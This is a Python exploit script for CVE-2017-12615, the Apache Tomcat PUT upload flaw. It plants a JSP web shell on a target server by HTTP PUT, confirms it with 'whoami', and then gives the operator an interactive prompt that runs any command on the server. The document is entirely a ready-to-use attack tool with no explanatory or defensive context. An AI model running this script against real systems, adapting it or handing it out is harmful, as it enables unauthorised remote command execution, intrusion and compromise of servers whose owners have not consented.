import requests
import sys
import time

url_in = sys.argv[1]
payload_url = url_in + "/1337.jsp/"
payload_header = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}

def payload_command(command_in):
    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in)+"</string>"
    payload_1 = command_filtered
    return payload_1

def creat_command_interface():
    payload_init = "<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();" \
                "int a = -1;" \
                "byte[] b = new byte[2048];" \
                "while((a=in.read(b))!=-1){out.println(new String(b));}" \
                "%>"
    result = requests.put(payload_url, headers=payload_header, data=payload_init)
    time.sleep(5)
    payload = {"cmd":"whoami"}
    verify_response = requests.get(payload_url[:-1], headers=payload_header, params=payload)
    if verify_response.status_code == 200:
        return 1
    else:
        return 0

def do_post(command_in):
    payload = {"cmd":command_in}
    result = requests.get(payload_url[:-1], params=payload)
    print(result.content.decode('utf-8', errors='ignore'))

print("***************************************************** \n"
       "****************   Coded By 1337g  ****************** \n"
       "*      CVE-2017-12615 Remote Command Execute EXP    * \n"
       "***************************************************** \n")

if (creat_command_interface() == 1):
    print("Command Page is Injected \n \n")
else:
    print("This host is not vulnerable")
    exit()

while True:
    command_in = input("Enter your command here: ")
    if command_in == "exit": 
        exit(0)
    do_post(command_in)
